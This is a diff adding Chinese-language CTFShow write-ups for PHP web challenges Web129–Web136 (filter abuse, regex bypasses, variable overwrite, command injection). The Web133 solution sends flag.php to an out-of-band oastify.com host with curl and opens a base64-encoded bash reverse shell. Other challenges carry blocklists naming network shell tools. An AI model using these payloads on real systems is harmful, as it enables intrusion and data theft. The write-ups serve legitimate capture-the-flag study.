@@ -672,7 +672,7 @@ flag=flag
 >    FLAG: flag
 >    Content-Type: application/x-www-form-urlencoded
 >    Content-Length: 9
->                                                                                           
+>                                                                                              
 >    flag=flag
 >    
 >    
@@ -1978,9 +1978,9 @@ if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'
 ?>
 ```
 
-![web125_SERVER_1](F:\桌面\CTFShow\image_php\web125_SERVER_1.png)
+![web125_SERVER_1](.\image_php\web125_SERVER_1.png)
 
-![web125_SERVER_2](F:\桌面\CTFShow\image_php\web125_SERVER_2.png)
+![web125_SERVER_2](.\image_php\web125_SERVER_2.png)
 
 所以可得payload为：
 
@@ -2106,4 +2106,369 @@ function check($str){
 payload：`f1=_&f2=get_defined_vars`
 
 不过在删掉过滤的时候本地测试时发现var_dump(call_user_func(call_user_func("strvar","get_definded_var")));是不行的，后面尝试了`$a="get_defined_vars";var_dump(call_user_func($a));`的方式都不能调用`get_defined_vars`，查了下资料说是call_user_func()函数不支持引用传递。按道理来说`call_user_func("_","get_definded_var")`回调结果也是一个变量应该也不行。不知道是不是版本问题，或者拓展问题毕竟`_()和gettext()`都是要安装拓展的。
+
+## Web129
+
+题目：
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-13 03:18:40
+
+*/
+
+
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_GET['f'])){
+    $f = $_GET['f'];
+    if(stripos($f, 'ctfshow')>0){
+        echo readfile($f);
+    }
+}
+```
+
+paylaod：
+
+```
+f=/ctfshow/../var/www/html/flag.php
+// php对无法识别的过滤器只会warning不会报错
+f=php://filter/ctfshow/resource=flag.php
+f=php://filter/ctfshow|convert.base64-encode/resource=flag.php
+```
+
+## Web130：preg_match数组绕过
+
+题目：
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-13 05:19:40
+
+*/
+
+
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+if(isset($_POST['f'])){
+    $f = $_POST['f'];
+
+    if(preg_match('/.+?ctfshow/is', $f)){
+        die('bye!');
+    }
+    if(stripos($f, 'ctfshow') === FALSE){
+        die('bye!!');
+    }
+
+    echo $flag;
+
+}
+```
+
+`if(preg_match('/.+?ctfshow/is', $f))`意思是如果匹配到ctfshow前面有任何字符都返回die
+
+> `/.+?ctfshow/is` 的含义如下：
+>
+> - `.` 表示匹配任意单个字符（除了换行符，除非使用了 `s` 修饰符）。
+> - `+` 表示匹配前面的元素一次或多次。
+> - `?` 使得 `+` 变为非贪婪模式，即尽可能少地匹配字符。
+> - `ctfshow` 是要匹配的确切字符串。
+> - i匹配大小写
+> - s单行匹配
+
+if(stripos($f, 'ctfshow') === FALSE)则表示$f中必须有`ctfshow`否则die
+
+所以直接给payload：`f=ctfshow`即可
+
+另外也可以使用数组绕过，由于stripos和preg_match都不支持数组所以传入数组都会返回false，payload:`f[]=ctfshow`
+
+## Web131：preg_match最大回溯法绕过
+
+题目：
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-13 05:19:40
+
+*/
+
+
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+if(isset($_POST['f'])){
+    $f = (String)$_POST['f'];
+
+    if(preg_match('/.+?ctfshow/is', $f)){
+        die('bye!');
+    }
+    if(stripos($f,'36Dctfshow') === FALSE){
+        die('bye!!');
+    }
+
+    echo $flag;
+
+}
+```
+
+不同于前一题使用数组绕过，这里加了强制类型转换(String)绕过传入数组$f会直接变成Array，这里使用最大回溯法绕过，preg_match在处理字符超过一定长度时会返回false这是php的一个安全特性以防止正则表达式的拒绝服务攻击（reDOS）;默认是1000000可以通过`var_dump(ini_get('pcre.backtrack_limit'));`查看回溯次数的最大限制。只要字符数超过最大回溯限制就会返回false
+
+payload：
+
+```python
+import requests
+
+buffer = "very"*(1000000//len("very"))+"36Dctfshow"
+data = {
+    "f":buffer
+}
+
+resp = requests.post("http://28ccf4b7-d103-4956-8cc9-b476ad42c263.challenge.ctf.show/",data=data,verify=False)
+print(resp.text)
+```
+
+> PHP回溯上限利用
+>
+> 常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。
+>
+> - DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。
+> - NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态。
+>
+> 大多数程序语言都使用NFA作为正则引擎，其中也包括PHP使用的PCRE库
+>
+> PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。
+
+## Web132
+
+题目：
+
+静态网站，浏览了下基本都是静态网页
+
+![web132_web](.\image_php\web132_web.png)
+
+dirsearch扫描
+
+![web132_dirsearch](F:\桌面\CTFShow\image_php\web132_dirsearch.png)
+
+访问/admin/index.php
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 06:22:13
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-13 20:05:36
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+#error_reporting(0);
+include("flag.php");
+highlight_file(__FILE__);
+
+
+if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
+    $username = (String)$_GET['username'];
+    $password = (String)$_GET['password'];
+    $code = (String)$_GET['code'];
+
+    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
+        
+        if($code == 'admin'){
+            echo $flag;
+        }
+        
+    }
+}
+```
+
+逻辑：`if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin")`这里使用的||运算直接username=admin绕过，在给个code=admin就直接拿到flag了
+
+payload:
+
+```
+/admin/index.php?code=admin&username=admin&password=666
+```
+
+## Web133
+
+题目：
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-13 16:43:44
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+//flag.php
+if($F = @$_GET['F']){
+    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
+        eval(substr($F,0,6));
+    }else{
+        die("6个字母都还不够呀?!");
+    }
+}
+```
+
+参考：
+
+[ctfshow web133和其他命令执行的骚操作-CSDN博客](https://blog.csdn.net/qq_46091464/article/details/109095382)
+
+关键是使用``执行命令
+
+payload：
+
+```
+方法一：
+?F=`$F`;+curl -F xx=@flag.php  sok4bsu5pputpnmse0ipafcwun0fo7cw.oastify.com
+方法二
+// 反弹shell,输入攻击机公网IP
+┌──(kali㉿kali)-[~]
+└─$ echo "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"|base64  
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxCg==
+
+┌──(kali㉿kali)-[~]
+└─$ bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxCg==}|{base64,-d}|bash"
+payload = `$F;+bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxCg==}|{base64,-d}|bash";`
+攻击机建立监听即可:
+nc -lvnp 4444
+```
+
+## Web134：parse_str()和extract()变量覆盖
+
+题目：
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-14 23:01:06
+
+*/
+
+highlight_file(__FILE__);
+$key1 = 0;
+$key2 = 0;
+if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
+    die("nonononono");
+}
+@parse_str($_SERVER['QUERY_STRING']);
+extract($_POST);
+if($key1 == '36d' && $key2 == '36d') {
+    die(file_get_contents('flag.php'));
+}
+```
+
+payload：有点骚不过之前有类似的题目
+
+```
+/?_POST[key1]=36d&_POST[key2]=36d
+```
+
+## Web135
+
+题目：
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-16 18:48:03
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+//flag.php
+if($F = @$_GET['F']){
+    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
+        eval(substr($F,0,6));
+    }else{
+        die("师傅们居然破解了前面的，那就来一个加强版吧");
+    }
+}
+```
+
+没有写文件限制
+
+payload:
+
+```bash
+F=`$F` ;nl flag.php>1.txt
+F=`$F` ;cp flag.php 1.txt
+F=`$F` ;mv flag.php 1.txt
+```
+
+## Web136
+
+题目：
+
+```php
+<?php
+error_reporting(0);
+function check($x){
+    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
+        die('too young too simple sometimes naive!');
+    }
+}
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    check($c);
+    exec($c);
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+不能使用>，这题关键是tee命令
+
+payload:
+
+```
+c=ls /|tee 1
+c=cat /f149_15_h3r3|tee 3
+```
+
+
 
